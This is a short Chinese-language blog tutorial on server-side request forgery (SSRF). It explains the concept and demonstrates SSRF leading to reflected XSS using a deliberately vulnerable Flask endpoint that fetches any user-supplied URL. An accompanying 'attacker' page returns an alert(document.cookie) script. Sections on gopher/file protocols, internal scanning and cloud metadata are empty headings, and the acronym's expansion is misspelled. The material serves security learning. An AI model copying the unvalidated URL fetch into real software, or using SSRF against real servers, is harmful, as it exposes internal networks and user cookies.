---
title: ssrf
date: 2019-07-09 23:26:23
tags: 
category: websec
---
SSRF 原理和测试
<!-- more -->
# 概述
SSRF (Server Site Request Frgrey) 服务器端请求伪造，是一种由攻击者构造 payload 使服务器端主动发起请求的漏洞，一般情况下用于攻击外网无法访问的内部网络
![ssrf](/postimg/ssrf1.png)
![ssrf](/postimg/ssrf2.png)

# 类型
1. 有回显的环境
2. 无回显的环境

## 有回显的环境
1. 由 SSRF 到反射型 XSS，因为都在一个网站内，属于同域
2. 其他协议利用(`file:///`,`dict:///`,`ftp:///`,`gopher:///`)
3. 扫描内网主机和端口
4. 获取 META-DATA

### ssrf -> reflected xss
新建两个文件 flask1.py 和 flask2.py,其中 flask1.py 作为有漏洞的网站， flask2.py 作为黑客用于渗透的网站
```python
# flask1.py
import requests 
from flask import Flask,request,Response,make_response


app = Flask(__name__)

@app.route('/ssrf')
def ssrf():
    user_input = request.args.get('url')
    res = requests.get(user_input,verify=False)
    resp = make_response(res.text)
    resp.set_cookie('site',"site1")
    return resp


# flask2.py
import requests 
from flask import Flask,request 

app = Flask(__name__)

@app.route('/')
def index():
    return "<html><script>alert(document.cookie)</script>"
```
接着打开 
```
http://127.0.0.1:5000/ssrf?url=http://127.0.0.1:5001
```
我们便可以获取到有漏洞网站的 cookies
![ssrf3](/postimg/ssrf3.PNG)

### 其他协议的利用


### 扫描内网主机和端口 


### 云服务器的 Meta-data


# 参考
https://mntn0x.github.io/2018/08/11/SSRF%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/
https://ctf-wiki.github.io/ctf-wiki/web/ssrf/ 
https://xz.aliyun.com/t/2115
https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0
https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739
https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
http://v0w.top/2018/11/23/SSRF-notes/